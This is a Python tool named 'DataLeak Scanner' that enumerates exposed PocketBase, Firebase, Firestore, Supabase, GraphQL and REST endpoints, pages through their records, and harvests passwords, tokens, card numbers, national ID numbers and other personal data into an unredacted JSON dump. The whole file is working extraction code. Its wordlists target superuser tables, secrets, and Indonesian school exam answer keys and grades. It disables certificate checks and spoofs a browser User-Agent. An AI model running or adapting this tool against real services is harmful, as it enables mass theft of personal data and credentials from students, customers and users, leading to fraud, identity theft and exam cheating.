#!/usr/bin/env python3
"""
DataLeak Scanner — PII/credential extractor from exposed web endpoints.
Detect, extract, classify, and report personal data leaks from vulnerable APIs.

Supports: REST API, PocketBase, Firebase, Supabase, GraphQL, generic JSON endpoints.
NOT OSINT — operates on already-discovered vulnerable endpoints.

Usage:
    python3 tools/dataleak.py <target_url>
    python3 tools/dataleak.py <target_url> --deep
    python3 tools/dataleak.py <target_url> --dump --output leak_report.json
    python3 tools/dataleak.py <target_url> --type pocketbase
    python3 tools/dataleak.py <target_url> --collections users,orders
    python3 tools/dataleak.py <target_url> --max-records 500
"""

import urllib.request, urllib.parse, urllib.error
import json, re, ssl, sys, os, time, hashlib
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ---------------------------------------------------------------------------
# PII Detection Patterns
# ---------------------------------------------------------------------------

PII_PATTERNS = {
    "email": re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'),
    "phone_id": re.compile(r'(?:(?:\+62|62|0)[\s\-]?)?(?:8[1-9]\d{7,10})'),
    "phone_intl": re.compile(r'\+?[1-9]\d{6,14}'),
    "ktp_nik": re.compile(r'\b[1-9]\d{15}\b'),
    "credit_card": re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b'),
    "ipv4": re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|1?\d{1,2})\.){3}(?:25[0-5]|2[0-4]\d|1?\d{1,2})\b'),
    "jwt": re.compile(r'eyJ[a-zA-Z0-9_\-]{10,}\.eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]+'),
    "bcrypt_hash": re.compile(r'\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}'),
    "md5_hash": re.compile(r'\b[a-f0-9]{32}\b'),
    "sha256_hash": re.compile(r'\b[a-f0-9]{64}\b'),
    "base64_long": re.compile(r'[A-Za-z0-9+/]{40,}={0,2}'),
    "api_key_generic": re.compile(r'(?:api[_\-]?key|apikey|access[_\-]?token|secret[_\-]?key)["\s:=]+["\']?([a-zA-Z0-9_\-]{16,})["\']?', re.I),
    "password_field": re.compile(r'(?:password|passwd|pass|pwd|sandi|kata_sandi)["\s:=]+["\']?([^\s"\',}{]{3,})["\']?', re.I),
    "url": re.compile(r'https?://[a-zA-Z0-9.\-]+(?:\:[0-9]+)?(?:/[^\s"\'<>,}{)]*)?'),
}

CREDENTIAL_KEYS = {
    'password', 'passwd', 'pass', 'pwd', 'sandi', 'kata_sandi',
    'secret', 'token', 'api_key', 'apikey', 'access_token',
    'refresh_token', 'private_key', 'secret_key', 'auth_token',
    'session_id', 'session_token', 'cookie',
}

PII_KEYS = {
    'email', 'e_mail', 'mail', 'phone', 'telepon', 'hp', 'no_hp',
    'handphone', 'mobile', 'whatsapp', 'wa', 'nomor',
    'nik', 'ktp', 'no_ktp', 'identity', 'id_card',
    'nama', 'name', 'full_name', 'first_name', 'last_name', 'username',
    'address', 'alamat', 'tanggal_lahir', 'dob', 'birth',
    'gender', 'jenis_kelamin', 'age', 'umur',
    'credit_card', 'card_number', 'cvv', 'expiry',
    'salary', 'gaji', 'balance', 'saldo',
    'ssn', 'social_security', 'passport',
}

SEVERITY_MAP = {
    'password_field': 'CRITICAL',
    'credit_card': 'CRITICAL',
    'jwt': 'CRITICAL',
    'bcrypt_hash': 'CRITICAL',
    'api_key_generic': 'CRITICAL',
    'ktp_nik': 'HIGH',
    'email': 'HIGH',
    'phone_id': 'HIGH',
    'phone_intl': 'MEDIUM',
    'md5_hash': 'MEDIUM',
    'sha256_hash': 'MEDIUM',
    'ipv4': 'MEDIUM',
    'base64_long': 'LOW',
    'url': 'INFO',
}

# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE

def fetch(url, method="GET", headers=None, data=None, timeout=12):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if headers:
        hdrs.update(headers)
    body_bytes = None
    if data:
        if isinstance(data, str):
            body_bytes = data.encode()
        else:
            body_bytes = json.dumps(data).encode()
            hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=_ctx)
        resp_body = resp.read().decode(errors='replace')
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, resp_headers, resp_body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace') if e.fp else ""
        return e.code, {}, body
    except Exception:
        return 0, {}, ""

def fetch_json(url, headers=None, timeout=12):
    code, hdrs, body = fetch(url, headers=headers, timeout=timeout)
    if code == 200 and body:
        try:
            return code, json.loads(body)
        except json.JSONDecodeError:
            pass
    return code, None

# ---------------------------------------------------------------------------
# PII Scanner
# ---------------------------------------------------------------------------

class PIIScanner:
    def __init__(self):
        self.findings = []
        self.stats = defaultdict(int)
        self.seen_values = set()
        self.records_scanned = 0
        self.pii_records = 0

    def scan_value(self, value, key_name="", source=""):
        if not isinstance(value, str) or len(value) < 3:
            return []
        hits = []
        key_lower = key_name.lower().replace('-', '_').replace(' ', '_')
        if key_lower in CREDENTIAL_KEYS and len(value) > 2:
            val_hash = hashlib.md5(value.encode()).hexdigest()[:12]
            if val_hash not in self.seen_values:
                self.seen_values.add(val_hash)
                hits.append({
                    'type': 'credential',
                    'subtype': key_lower,
                    'key': key_name,
                    'value': value,
                    'severity': 'CRITICAL',
                    'source': source,
                })
                self.stats['credential'] += 1

        if key_lower in PII_KEYS and len(value) > 1:
            val_hash = hashlib.md5(f"{key_lower}:{value}".encode()).hexdigest()[:12]
            if val_hash not in self.seen_values:
                self.seen_values.add(val_hash)
                hits.append({
                    'type': 'pii_field',
                    'subtype': key_lower,
                    'key': key_name,
                    'value': value,
                    'severity': 'HIGH',
                    'source': source,
                })
                self.stats['pii_field'] += 1

        for ptype, pattern in PII_PATTERNS.items():
            if ptype in ('url', 'base64_long', 'ipv4'):
                continue
            matches = pattern.findall(value)
            for m in matches[:5]:
                match_val = m if isinstance(m, str) else m[0] if m else ""
                if len(match_val) < 4:
                    continue
                val_hash = hashlib.md5(f"{ptype}:{match_val}".encode()).hexdigest()[:12]
                if val_hash in self.seen_values:
                    continue
                self.seen_values.add(val_hash)
                hits.append({
                    'type': 'pattern_match',
                    'subtype': ptype,
                    'key': key_name,
                    'value': match_val,
                    'severity': SEVERITY_MAP.get(ptype, 'MEDIUM'),
                    'source': source,
                })
                self.stats[ptype] += 1
        return hits

    def scan_dict(self, obj, source="", prefix=""):
        hits = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{prefix}.{k}" if prefix else k
                if isinstance(v, str):
                    hits += self.scan_value(v, key_name=k, source=source)
                elif isinstance(v, (dict, list)):
                    hits += self.scan_dict(v, source=source, prefix=full_key)
                elif isinstance(v, (int, float)) and k.lower() in PII_KEYS:
                    hits += self.scan_value(str(v), key_name=k, source=source)
        elif isinstance(obj, list):
            for i, item in enumerate(obj[:200]):
                hits += self.scan_dict(item, source=source, prefix=prefix)
        self.findings.extend(hits)
        return hits

    def scan_records(self, records, source=""):
        if not isinstance(records, list):
            records = [records]
        total_hits = []
        for rec in records:
            self.records_scanned += 1
            h = self.scan_dict(rec, source=source)
            if h:
                self.pii_records += 1
            total_hits.extend(h)
        return total_hits

# ---------------------------------------------------------------------------
# Platform-specific extractors
# ---------------------------------------------------------------------------

class PocketBaseExtractor:
    def __init__(self, base_url, scanner, max_records=200):
        self.base = base_url.rstrip('/')
        self.scanner = scanner
        self.max_records = max_records
        self.collections_found = []
        self.data = {}

    COMMON_COLLECTIONS = [
        "users", "_superusers", "_authOrigins", "_externalAuths", "_mfas",
        "DataUsers", "DataUjian", "DataPengawas", "DataJawaban", "DataKunci",
        "DataSoal", "DataNilai", "DataSiswa", "DataGuru", "DataSekolah",
        "DataMapel", "DataKelas",
        "accounts", "profiles", "posts", "comments", "orders",
        "products", "settings", "logs", "sessions", "notifications",
        "customers", "invoices", "payments", "subscriptions",
        "messages", "chats", "files", "media", "uploads",
        "admin", "config", "roles", "permissions",
        "siswa", "guru", "pengawas", "ujian", "jawaban", "soal", "nilai",
        "sekolah", "kelas", "mapel", "kunci",
        "students", "teachers", "exams", "answers", "questions", "scores",
    ]

    def discover_collections(self):
        print("[*] PocketBase: Enumerating collections...")
        found = []

        def probe(col):
            url = f"{self.base}/api/collections/{col}/records?perPage=1"
            code, data = fetch_json(url, timeout=8)
            if code == 200 and data and isinstance(data, dict):
                total = data.get('totalItems', 0)
                if total > 0 or 'items' in data:
                    return col, total, data
            return col, 0, None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = {ex.submit(probe, c): c for c in self.COMMON_COLLECTIONS}
            for fut in as_completed(futures):
                col, total, data = fut.result()
                if total > 0 or data:
                    found.append((col, total))
                    print(f"    [+] {col}: {total} records")

        self.collections_found = found
        return found

    def extract_collection(self, collection, max_pages=10):
        records = []
        page = 1
        per_page = 50
        while page <= max_pages and len(records) < self.max_records:
            url = f"{self.base}/api/collections/{collection}/records?perPage={per_page}&page={page}"
            code, data = fetch_json(url, timeout=12)
            if code != 200 or not data:
                break
            items = data.get('items', [])
            if not items:
                break
            records.extend(items)
            total = data.get('totalItems', 0)
            if len(records) >= total:
                break
            page += 1
            time.sleep(0.15)
        return records

    def extract_all(self):
        if not self.collections_found:
            self.discover_collections()

        print(f"\n[*] PocketBase: Extracting data from {len(self.collections_found)} collections...")
        for col, total in self.collections_found:
            print(f"    [*] {col} ({total} records)...")
            records = self.extract_collection(col)
            if records:
                self.data[col] = records
                hits = self.scanner.scan_records(records, source=f"pocketbase/{col}")
                print(f"        → {len(records)} extracted, {len(hits)} PII matches")
            time.sleep(0.2)
        return self.data


class FirebaseExtractor:
    def __init__(self, project_id, scanner, db_url=None, max_records=200):
        self.project_id = project_id
        self.db_url = db_url or f"https://{project_id}-default-rtdb.firebaseio.com"
        self.scanner = scanner
        self.max_records = max_records
        self.data = {}

    COMMON_PATHS = [
        "", "users", "accounts", "profiles", "admin",
        "orders", "payments", "messages", "posts",
        "config", "settings", "secrets", "tokens",
        "students", "teachers", "exams", "scores",
        "siswa", "guru", "ujian", "nilai",
    ]

    def extract(self):
        print("[*] Firebase RTDB: Probing...")
        for path in self.COMMON_PATHS:
            url = f"{self.db_url}/{path}.json?shallow=true"
            code, data = fetch_json(url, timeout=10)
            if code == 200 and data and isinstance(data, dict):
                label = path or "root"
                print(f"    [+] /{label}: {len(data)} keys")
                full_url = f"{self.db_url}/{path}.json?limitToFirst={self.max_records}"
                code2, full_data = fetch_json(full_url, timeout=15)
                if code2 == 200 and full_data:
                    self.data[label] = full_data
                    hits = self.scanner.scan_dict(full_data, source=f"firebase/{label}")
                    print(f"        → {len(hits)} PII matches")
            time.sleep(0.2)
        return self.data


class FirestoreExtractor:
    def __init__(self, project_id, scanner, max_records=200):
        self.project_id = project_id
        self.scanner = scanner
        self.max_records = max_records
        self.data = {}

    COMMON_COLLECTIONS = [
        "users", "accounts", "profiles", "admin", "orders",
        "payments", "messages", "posts", "config", "settings",
    ]

    def extract(self):
        print("[*] Firestore: Probing collections...")
        base = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        for col in self.COMMON_COLLECTIONS:
            url = f"{base}/{col}?pageSize=50"
            code, data = fetch_json(url, timeout=10)
            if code == 200 and data and 'documents' in data:
                docs = data['documents']
                print(f"    [+] {col}: {len(docs)} documents")
                self.data[col] = docs
                hits = self.scanner.scan_dict(docs, source=f"firestore/{col}")
                print(f"        → {len(hits)} PII matches")
            time.sleep(0.2)
        return self.data


class SupabaseExtractor:
    def __init__(self, base_url, anon_key, scanner, max_records=200):
        self.base = base_url.rstrip('/')
        self.anon_key = anon_key
        self.scanner = scanner
        self.max_records = max_records
        self.data = {}

    COMMON_TABLES = [
        "users", "profiles", "accounts", "auth.users",
        "orders", "products", "payments", "subscriptions",
        "posts", "comments", "messages", "notifications",
    ]

    def extract(self):
        print("[*] Supabase: Probing tables...")
        headers = {
            "apikey": self.anon_key,
            "Authorization": f"Bearer {self.anon_key}",
        }
        for table in self.COMMON_TABLES:
            url = f"{self.base}/rest/v1/{table}?select=*&limit={self.max_records}"
            code, data = fetch_json(url, headers=headers, timeout=10)
            if code == 200 and data and isinstance(data, list) and len(data) > 0:
                print(f"    [+] {table}: {len(data)} rows")
                self.data[table] = data
                hits = self.scanner.scan_records(data, source=f"supabase/{table}")
                print(f"        → {len(hits)} PII matches")
            time.sleep(0.2)
        return self.data


class GenericAPIExtractor:
    def __init__(self, base_url, scanner, token=None, max_records=200):
        self.base = base_url.rstrip('/')
        self.scanner = scanner
        self.token = token
        self.max_records = max_records
        self.data = {}

    ENDPOINTS = [
        "/api/users", "/api/user", "/api/accounts", "/api/profiles",
        "/api/admin/users", "/api/v1/users", "/api/v2/users",
        "/api/customers", "/api/members", "/api/contacts",
        "/api/orders", "/api/transactions", "/api/payments",
        "/api/invoices", "/api/subscriptions",
        "/api/config", "/api/settings", "/api/env",
        "/api/logs", "/api/sessions", "/api/tokens",
        "/api/messages", "/api/notifications", "/api/emails",
        "/api/files", "/api/uploads", "/api/exports",
        "/api/dashboard", "/api/stats", "/api/analytics",
        "/api/me", "/api/profile", "/api/account",
        "/users", "/accounts", "/profiles", "/admin/users",
        "/v1/users", "/v2/users", "/members",
        "/graphql",
    ]

    def extract(self):
        print("[*] Generic API: Probing endpoints...")
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        def probe(ep):
            url = self.base + ep
            code, data = fetch_json(url, headers=headers, timeout=8)
            if code == 200 and data:
                if isinstance(data, list) and len(data) > 0:
                    return ep, data, len(data)
                elif isinstance(data, dict):
                    items = data.get('data') or data.get('items') or data.get('results') or data.get('users') or data.get('records')
                    if isinstance(items, list) and len(items) > 0:
                        return ep, items, len(items)
                    elif len(json.dumps(data)) > 50:
                        return ep, data, 1
            return ep, None, 0

        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(probe, ep): ep for ep in self.ENDPOINTS}
            for fut in as_completed(futures):
                ep, data, count = fut.result()
                if data and count > 0:
                    print(f"    [+] {ep}: {count} records")
                    self.data[ep] = data
                    if isinstance(data, list):
                        hits = self.scanner.scan_records(data, source=f"api:{ep}")
                    else:
                        hits = self.scanner.scan_dict(data, source=f"api:{ep}")
                    print(f"        → {len(hits)} PII matches")

        return self.data


class GraphQLExtractor:
    def __init__(self, base_url, scanner, endpoint="/graphql"):
        self.url = base_url.rstrip('/') + endpoint
        self.scanner = scanner
        self.data = {}

    QUERIES = [
        ('introspection', '{"query":"{ __schema { types { name kind fields { name type { name } } } } }"}'),
        ('users', '{"query":"{ users { id email name phone password role } }"}'),
        ('accounts', '{"query":"{ accounts { id email username password } }"}'),
        ('profiles', '{"query":"{ profiles { id name email phone address } }"}'),
        ('orders', '{"query":"{ orders { id userId amount status } }"}'),
    ]

    def extract(self):
        print("[*] GraphQL: Probing...")
        headers = {"Content-Type": "application/json"}
        for label, query in self.QUERIES:
            code, hdrs, body = fetch(self.url, method="POST", data=query, headers=headers, timeout=10)
            if code == 200 and body:
                try:
                    data = json.loads(body)
                    if 'data' in data and data['data']:
                        print(f"    [+] {label}: data returned")
                        self.data[label] = data['data']
                        hits = self.scanner.scan_dict(data['data'], source=f"graphql/{label}")
                        print(f"        → {len(hits)} PII matches")
                except json.JSONDecodeError:
                    pass
            time.sleep(0.3)
        return self.data

# ---------------------------------------------------------------------------
# Report generator
# ---------------------------------------------------------------------------

def classify_severity(findings):
    classified = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'INFO': []}
    for f in findings:
        sev = f.get('severity', 'INFO')
        classified[sev].append(f)
    return classified

def redact(value, keep=3):
    if not value or len(value) <= keep + 3:
        return value
    return value[:keep] + '*' * min(len(value) - keep, 12)

def generate_report(scanner, extractors_data, target, output_file=None):
    classified = classify_severity(scanner.findings)

    print("\n" + "=" * 70)
    print(f"  DATA LEAK REPORT — {target}")
    print(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    print(f"\n  Records scanned:    {scanner.records_scanned}")
    print(f"  Records with PII:   {scanner.pii_records}")
    print(f"  Total PII matches:  {len(scanner.findings)}")
    print(f"  Unique patterns:    {len(scanner.seen_values)}")

    sev_colors = {'CRITICAL': '\033[91m', 'HIGH': '\033[93m', 'MEDIUM': '\033[33m', 'LOW': '\033[94m', 'INFO': '\033[90m'}
    reset = '\033[0m'

    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
        items = classified[sev]
        if not items:
            continue
        color = sev_colors[sev]
        print(f"\n  {color}{'─' * 60}")
        print(f"  [{sev}] — {len(items)} findings{reset}")
        print(f"  {color}{'─' * 60}{reset}")
        seen_summary = set()
        for f in items:
            summary = f"{f['subtype']}|{f['source']}"
            if summary in seen_summary:
                continue
            seen_summary.add(summary)
            same = [x for x in items if x['subtype'] == f['subtype'] and x['source'] == f['source']]
            sample = same[0]['value']
            print(f"    {color}■{reset} {f['subtype']} ({len(same)}x) — source: {f['source']}")
            print(f"      key: {same[0].get('key', 'N/A')}  sample: {redact(sample)}")

    if scanner.stats:
        print(f"\n  {'─' * 60}")
        print("  PII Type Breakdown:")
        for ptype, count in sorted(scanner.stats.items(), key=lambda x: -x[1]):
            sev = SEVERITY_MAP.get(ptype, 'MEDIUM')
            color = sev_colors.get(sev, '')
            print(f"    {color}■{reset} {ptype}: {count}")

    print(f"\n{'=' * 70}\n")

    if output_file:
        report = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'records_scanned': scanner.records_scanned,
                'records_with_pii': scanner.pii_records,
                'total_matches': len(scanner.findings),
                'severity_breakdown': {k: len(v) for k, v in classified.items()},
                'type_breakdown': dict(scanner.stats),
            },
            'findings': scanner.findings,
            'data_sources': {k: len(v) if isinstance(v, list) else 1 for k, v in extractors_data.items()},
        }
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        print(f"  [+] Report saved: {output_file}")

    return classified

# ---------------------------------------------------------------------------
# Auto-detect platform
# ---------------------------------------------------------------------------

def detect_platform(base_url):
    checks = [
        ("pocketbase", "/api/health"),
        ("pocketbase", "/_/"),
    ]
    for platform, path in checks:
        code, _, body = fetch(base_url + path, timeout=6)
        if code == 200:
            if platform == "pocketbase" and ("health" in body.lower() or '{"code":' in body or '<html' in body.lower()):
                return "pocketbase"

    code, _, body = fetch(base_url, timeout=6)
    if 'firebaseapp.com' in body or 'firebase' in body.lower():
        return "firebase"
    if 'supabase' in body.lower():
        return "supabase"

    code_gql, _, body_gql = fetch(base_url + "/graphql", method="POST",
                                    data='{"query":"{ __typename }"}',
                                    headers={"Content-Type": "application/json"}, timeout=6)
    if code_gql == 200 and '__typename' in body_gql:
        return "graphql"

    return "generic"

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run(target, platform=None, deep=False, dump=False, output=None,
        token=None, collections=None, max_records=200):
    base = target.rstrip('/')
    scanner = PIIScanner()
    all_data = {}

    if not platform:
        print(f"[*] Auto-detecting platform for {base}...")
        platform = detect_platform(base)
        print(f"    → Detected: {platform}")

    if platform == "pocketbase":
        ext = PocketBaseExtractor(base, scanner, max_records=max_records)
        if collections:
            ext.collections_found = [(c, 0) for c in collections]
        data = ext.extract_all()
        all_data.update({f"pb/{k}": v for k, v in data.items()})

    elif platform == "firebase":
        project_id = base.split('//')[1].split('.')[0] if '//' in base else base
        ext = FirebaseExtractor(project_id, scanner, db_url=base if base.startswith('http') else None, max_records=max_records)
        data = ext.extract()
        all_data.update({f"fb/{k}": v for k, v in data.items()})
        fs_ext = FirestoreExtractor(project_id, scanner, max_records=max_records)
        fs_data = fs_ext.extract()
        all_data.update({f"fs/{k}": v for k, v in fs_data.items()})

    elif platform == "supabase":
        anon_key = token or ""
        ext = SupabaseExtractor(base, anon_key, scanner, max_records=max_records)
        data = ext.extract()
        all_data.update({f"sb/{k}": v for k, v in data.items()})

    elif platform == "graphql":
        ext = GraphQLExtractor(base, scanner)
        data = ext.extract()
        all_data.update({f"gql/{k}": v for k, v in data.items()})

    if platform in ("generic", None) or deep:
        ext = GenericAPIExtractor(base, scanner, token=token, max_records=max_records)
        data = ext.extract()
        all_data.update({f"api/{k}": v for k, v in data.items()})

    if deep and platform != "graphql":
        gql = GraphQLExtractor(base, scanner)
        gql_data = gql.extract()
        all_data.update({f"gql/{k}": v for k, v in gql_data.items()})

    output_file = output if dump else None
    classified = generate_report(scanner, all_data, target, output_file=output_file)

    return {
        'target': target,
        'platform': platform,
        'findings': scanner.findings,
        'classified': {k: len(v) for k, v in classified.items()},
        'stats': dict(scanner.stats),
        'records_scanned': scanner.records_scanned,
        'pii_records': scanner.pii_records,
        'data': all_data if dump else {},
    }


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DataLeak Scanner — PII extractor from exposed endpoints")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--type", choices=["pocketbase", "firebase", "supabase", "graphql", "generic"], help="Force platform type")
    parser.add_argument("--deep", action="store_true", help="Deep scan — all extractors")
    parser.add_argument("--dump", action="store_true", help="Save full data dump")
    parser.add_argument("--output", "-o", default="dataleak_report.json", help="Output file for dump")
    parser.add_argument("--token", "-t", help="Auth token for protected endpoints")
    parser.add_argument("--collections", "-c", help="Comma-separated collection names to target")
    parser.add_argument("--max-records", type=int, default=200, help="Max records per collection")
    args = parser.parse_args()

    cols = args.collections.split(',') if args.collections else None
    result = run(
        args.target,
        platform=args.type,
        deep=args.deep,
        dump=args.dump,
        output=args.output,
        token=args.token,
        collections=cols,
        max_records=args.max_records,
    )

    total = len(result['findings'])
    if total == 0:
        print("[*] No PII/credential exposure detected.")
    else:
        print(f"[!] {total} PII/credential exposures found!")
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            c = result['classified'].get(sev, 0)
            if c:
                print(f"    {sev}: {c}")
